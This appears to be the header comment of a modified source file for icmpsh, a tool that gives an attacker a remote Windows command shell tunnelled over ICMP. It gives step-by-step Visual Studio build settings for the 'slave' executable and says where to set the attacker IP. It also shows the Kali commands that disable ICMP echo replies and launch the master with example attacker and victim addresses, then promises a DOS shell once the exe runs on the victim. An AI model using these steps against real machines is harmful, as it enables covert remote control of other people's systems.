 icmpsh - icmp windows MASTER-SLAVE shell
 Original Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>

     Modified by F.Zinzloun.Bersani to a Win32 C console app. Folloows configuration in VS 2015\17:
	 - create a C++ Win32 Console App
	 - delete all the headers file, leave only the main cpp file
	 - copy the content of this file inside the main cpp file. Change the extension of the file in .c
	 - configure the attacker IP at line 39
	 - open the project's properties window,expand C/C++, select All options and set the following:
		-Compile as: Compile as C code/TC
		-Precompiled Headers: Not using precompiled headers
		-Runtime library to Multi-threaded/MT (will include the visual c++ runtime in the exe)
    That should be enough. Generate it. Tested on Windows Server 2008 64bit, Windows 10 Home\Pro Edition 64 bit
	
    On the attacker machine, of course a Kali box execute the master after having disabled ICMP replies (set to 0 to restore it)
    #sysctl -w net.ipv4.icmp_echo_ignore_all=1
    
    execute the master: icmpsh-master.py <attacker (master) IP address> <victim (slave) IP address>
    ./icmpsh_master.py 192.168.1.66 192.168.1.17

    Now the master is waiting for the incoming victim connection...
    
    On the windows victim (slave) machine execute the compiled exe,
    check the Linux master box, you should get a DOS shell!  
